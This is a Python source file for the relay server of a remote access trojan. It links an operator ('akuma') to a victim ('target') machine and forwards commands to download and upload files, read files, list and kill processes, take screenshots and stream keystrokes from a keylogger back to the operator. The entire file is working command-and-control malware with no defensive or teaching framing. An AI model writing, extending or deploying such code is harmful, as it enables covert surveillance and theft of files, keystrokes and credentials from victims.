import socket
import threading

class Bridge:
    def __init__(self,port=9876,host=socket.gethostbyname(socket.gethostname())):
        self.HOST=host
        self.PORT=port
        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.server.bind((self.HOST,self.PORT))
        self.CON_KEY_f=True
        self.CON_AKU=False
        self.CON_TAR=False
        self.akuma=None
        self.ADDR_AKUMA=None
        self.target=None
        self.ADDR_TARGET=None
        self.dlc_key=False
        self.cur_dir=''
        self.dlc_clients=[]
        self.CMD_LIST={
            'pwd':self.path_to_dir,
            'terminate':self.terminate,
            'tasklist':self.tasks,
            'ls':self.list_files,
            'kill':self.kill_proc,
            'cd':self.change_dir,
            'cat':self.cat,
            'download':self.download,
            'upload':self.upload,
            'key_listen':self.exec_key_listen,
            'take_ss':self.take_ss
        }    
    def check_tar(self,command):
        try:
            self.target.send(command.encode('utf-8'));return 1
        except ConnectionResetError:self.CON_TAR=False;self.target.close();return 0
    def send_data(self):
        tar_bytes=b""
        while True:
            data=self.target.recv(1024)
            tar_bytes+=data
            if(tar_bytes[-5:]==b"<END>"):
                self.akuma.sendall(tar_bytes)
                break
    def transport(self):
        if(self.check_tar(self.cmd)):out=self.target.recv(1024);self.akuma.send(out)
        else:self.akuma.send('[!] TAR_CON CLOSED'.encode('utf-8'))
    def take_ss(self):
        if(self.check_tar('KrQ1')):
            self.send_data()
    def key_listen(self):
        while len(self.dlc_clients)<2:
            self.dlc_server.listen()
            k_comm,k_addr=self.dlc_server.accept()
            self.dlc_clients.append(k_comm)
            print('[CLIENT ADDED]')
        self.dlc_clients[0].send('1'.encode('utf-8'))
        if('-a' in self.dlc_cmd):
            self.dlc_clients[1].send("1".encode('utf-8'))
        while self.dlc_key:
            try:
                char=self.dlc_clients[0].recv(30)
                self.dlc_clients[1].send(char)
            except ConnectionAbortedError as err:
                print(f'[!] {repr(err)}')
    def exec_key_listen(self):
        if('on' in self.cmd and not self.dlc_key):
            self.dlc_cmd=self.cmd
            self.dlc_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.dlc_PORT=self.PORT-1
            self.dlc_server.bind((self.HOST,self.dlc_PORT))
            self.dlc_thread=threading.Thread(target=self.key_listen,args=())
            self.dlc_thread.start()
            self.target.send('dlc_on'.encode('utf-8'))
            self.target.recv(1024).decode('utf-8')
            self.akuma.send('1'.encode('utf-8'))
            self.dlc_key=True
        if('off' in self.cmd and self.dlc_key):
            self.dlc_server.close()
            self.target.send('dlc_off'.encode('utf-8'))
            self.dlc_clients[0].close()
            self.dlc_clients[1].close()
            self.dlc_clients=[]
            self.dlc_key=False
    def upload(self):
        if(self.check_tar(self.cmd)):
            is_err=self.target.recv(1024).decode('utf-8')
            if(is_err=="1"):
                self.akuma.send('1'.encode('utf-8'))
                aku_bytes=b""
                while True:
                    data=self.akuma.recv(1024)
                    aku_bytes+=data
                    if(aku_bytes[-5:]==b"<END>"):
                        self.target.sendall(aku_bytes)
                        break
                out=self.target.recv(1024)
                self.akuma.send(out)
            else:
                self.akuma.send(is_err.encode('utf-8'))
        else:
            self.akuma.send("[!] TAR_CON CLOSED".encode('utf-8'))
    def download(self):
        if(self.check_tar(self.cmd)):self.send_data()
        else:self.akuma.sendall("[!] TAR_CON CLOSED".encode('utf-8'));self.akuma.send(b"<END>")
    def cat(self):
        if(self.check_tar(self.cmd)):self.send_data()
        else:self.akuma.sendall("[!] TAR_CON CLOSED".encode('utf-8'));self.akuma.send(b"<END>")
    def change_dir(self):
        self.transport()
    def kill_proc(self):
        self.transport()
    def path_to_dir(self):
        self.transport()
    def terminate(self):
        if(len(self.cmd_list)==1):
            self.akuma.close()
            self.CON_AKU=False
            print('[!] AKUMA CLOSED THE CONNECTION')
        elif(len(self.cmd_list)==2):
            self.target.send(self.cmd.encode('utf-8'))
            self.CON_KEY_f=False;self.CON_AKU=False;self.CON_TAR=False;self.akuma.close();self.target.close()
    def tasks(self):
        self.target.send(self.cmd.encode('utf-8'))
        self.send_data()
    def list_files(self):
        if(self.check_tar(self.cmd)):self.send_data()
        else:self.akuma.sendall("[!] TAR_CON CLOSED".encode('utf-8'));self.akuma.send(b"<END>")
    def default(self):
        if(self.check_tar(self.cmd)):
            self.send_data()
        else:self.akuma.sendall("[!] TAR_CON CLOSED".encode('utf-8'));self.akuma.send(b"<END>")
    def execute(self,command):
        if(len(self.cmd_list)>0):
            if(command in self.CMD_LIST):
                list(self.CMD_LIST.values())[list(self.CMD_LIST.keys()).index(command)]()
            else:
                self.default()
    def checkCONS(self):
        while True:
            self.server.listen()
            print('[WAITING FOR CONNECTION]',end="",flush=True)
            comm,addr=self.server.accept()
            token=int(comm.recv(1024).decode('utf-8'))
            if(token==1):
                print(':[CONNECTION FROM AKUMA]')
                self.akuma=comm;self.ADDR_AKUMA=addr
                self.CON_AKU=True
            elif(token==0):
                print(':[CONNECTION FROM TARGET]')
                self.target=comm;self.ADDR_TARGET=addr
                self.CON_TAR=True
                self.target.send('1'.encode('utf-8'))
                self.cur_dir=self.target.recv(1024).decode('utf-8')
            else:
                print(f'[!] TOKEN: {token}')
            if(self.CON_TAR and self.CON_AKU):
                self.akuma.send(self.cur_dir.encode('utf-8'))
                return True
    def connection(self):
        while self.CON_KEY_f:
            self.checkCONS()
            while self.CON_AKU and self.CON_TAR:
                try:
                    self.cmd=self.akuma.recv(1024).decode('utf-8')
                except ConnectionResetError as err:
                    print('[!] AKUMA CLOSED THE CONNECTION')
                    self.CON_AKU=False
                    self.akuma.close()             
                    break       
                if(self.cmd):
                    self.cmd_list=self.cmd.split()
                    try:
                        self.execute(self.cmd_list[0])
                    except IndexError as err:
                        print(f"[!] {repr(err)}")
                else:
                    print('[!] AKUMA CLOSED THE CONNECTION')
                    self.CON_AKU=False
                    self.akuma.close()
bridge = Bridge(9876)
bridge.connection()
